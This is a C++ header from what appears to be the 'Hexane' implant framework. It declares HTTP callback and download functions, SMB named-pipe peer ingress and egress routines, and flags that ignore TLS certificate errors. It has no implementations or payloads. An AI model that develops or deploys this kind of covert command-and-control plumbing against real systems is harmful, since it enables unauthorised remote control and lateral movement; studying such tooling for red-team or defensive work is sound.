#ifndef HEXANE_CORELIB_NETWORK_HPP
#define HEXANE_CORELIB_NETWORK_HPP

#define INTERNET_OPEN_TYPE_PROXY                3
#define WINHTTP_FLAG_BYPASS_PROXY_CACHE     	0x00000100
#define WINHTTP_FLAG_REFRESH                	WINHTTP_FLAG_BYPASS_PROXY_CACHE
#define WINHTTP_FLAG_SECURE                 	0x00800000

#define WINHTTP_NO_REFERER                  	NULL
#define WINHTTP_NO_ADDITIONAL_HEADERS       	NULL
#define INTERNET_OPEN_TYPE_PRECONFIG			0
#define HTTP_QUERY_CONTENT_LENGTH			    5
#define INTERNET_ERROR_BASE				        12000
#define INTERNET_FLAG_RELOAD				    0x80000000
#define INTERNET_FLAG_IGNORE_CERT_CN_INVALID	0x00001000
#define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID	0x00002000
#define ERROR_HTTP_HEADER_NOT_FOUND			    (INTERNET_ERROR_BASE + 150)
#include <core/corelib.hpp>

struct _request {
    HINTERNET conn_handle;
    HINTERNET req_handle;
    LPWSTR endpoint;
};

struct _proxy_context {
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG    proxy_config;
    WINHTTP_AUTOPROXY_OPTIONS               autoproxy;
    WINHTTP_PROXY_INFO                      proxy_info;
};

namespace Network {
    namespace Http {
        FUNCTION BOOL SetHeaders(_request *request);
        FUNCTION VOID HttpDownload(_request *request, _stream **stream);
        FUNCTION VOID HttpCallback(const _stream *const out, _stream **in);
    }

    namespace Smb {
        FUNCTION BOOL PipeRead(_stream *in, void *handle);
        FUNCTION BOOL PipeWrite(_stream *out, void *handle);
        FUNCTION VOID PeerConnectIngress (_stream *out, _stream **in);
        FUNCTION VOID PeerConnectEgress(_stream *out, _stream **in);
        FUNCTION VOID SmbPipeReceive(_stream *in, void *handle);
        FUNCTION VOID SmbContextInit(PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr);
        FUNCTION VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr);
    }
}
#endif //HEXANE_CORELIB_NETWORK_HPP
